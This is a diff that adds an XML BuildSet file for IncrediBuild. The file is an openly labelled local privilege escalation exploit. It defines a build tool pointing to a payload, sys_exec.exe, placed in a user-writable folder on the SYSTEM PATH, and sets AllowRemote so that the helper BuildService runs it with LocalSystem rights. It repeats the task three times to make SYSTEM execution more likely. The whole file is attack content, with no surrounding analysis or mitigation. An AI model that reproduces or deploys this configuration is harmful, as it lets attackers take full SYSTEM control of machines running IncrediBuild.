@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
+<!--
+  IncrediBuild LPE via XML Interface BuildSet
+  This XML defines a "build task" using sys_exec.exe as the tool.
+  BuildConsole distributes these tasks to the helper agent (BuildService, SYSTEM).
+  AllowRemote="true" = task executes on the helper (LocalSystem privilege).
+-->
+<BuildSet FormatVersion="1">
+  <Environments>
+    <Environment Name="LPE">
+      <Tools>
+        <!-- Tool path: our payload in vmware\bin (user-writable, in SYSTEM PATH) -->
+        <Tool Name="SysExec"
+              Path="C:\Users\Admin\Documents\vmware\bin\sys_exec.exe"
+              AllowRemote="true"
+              OutputFileMasks="*.*"
+              Params="" />
+      </Tools>
+      <Variables>
+        <Variable Name="Dummy" Value="1" />
+      </Variables>
+    </Environment>
+  </Environments>
+  <Project Env="LPE" Name="LPE Attack" WorkingDir="C:\ProgramData">
+    <!-- Multiple tasks to maximize chance of remote (SYSTEM) execution -->
+    <TaskGroup Name="LPE Tasks" Tool="SysExec">
+      <Task Params="" Caption="LPE Task 1" />
+      <Task Params="" Caption="LPE Task 2" />
+      <Task Params="" Caption="LPE Task 3" />
+    </TaskGroup>
+  </Project>
+</BuildSet>
